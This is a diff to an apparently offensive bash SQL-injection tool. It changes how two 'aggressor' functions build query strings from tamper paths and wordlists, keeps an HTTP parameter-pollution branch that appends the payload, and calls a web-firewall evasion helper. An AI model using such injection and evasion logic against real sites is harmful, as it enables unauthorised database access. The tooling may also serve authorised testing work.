@@ -142,14 +142,14 @@ vector_sqli_agressor_left() {
         final_query="${default_path}${defiance_tamper_path}"
 
         if [[ "$WORDLIST_MYSQL" == *"nonphp"* || "$WORDLIST_MYSQL" == *"HAHA"* ]]; then
-            final_query="${default_path}${defiance_tamper_path}${query_payload}"
+            final_query="${default_path}${defiance_tamper_path}"
         else
             if [[ "$defiance_tamper_path" == *"="* ]]; then
                 local param_name=$(echo "$defiance_tamper_path" | cut -d'=' -f1)
                 local param_val=$(echo "$defiance_tamper_path" | cut -d'=' -f2-)
                 final_query="${default_path}${param_name}=999&${param_name}=${param_val}${query_payload}"
             else
-                final_query="${default_path}${defiance_tamper_path}${query_payload}"
+                final_query="${default_path}${defiance_tamper_path}"
             fi
         fi
 
@@ -201,14 +201,14 @@ vector_sqli_agressor_right() {
         final_query="${default_path}${defiance_tamper_path}"
 
                 if [[ "$WORDLIST_MYSQL" == *"nonphp"* || "$WORDLIST_MYSQL" == *"HAHA"* ]]; then
-            final_query="${default_path}${defiance_tamper_path}${query_payload}"
+            final_query="${default_path}${defiance_tamper_path}"
         else
             if [[ "$defiance_tamper_path" == *"="* ]]; then
                 local param_name=$(echo "$defiance_tamper_path" | cut -d'=' -f1)
                 local param_val=$(echo "$defiance_tamper_path" | cut -d'=' -f2-)
                 final_query="${default_path}${param_name}=999&${param_name}=${param_val}${query_payload}"
             else
-                final_query="${default_path}${defiance_tamper_path}${query_payload}"
+                final_query="${default_path}${defiance_tamper_path}"
             fi
         fi
         local waf_trick=$(braindamage)
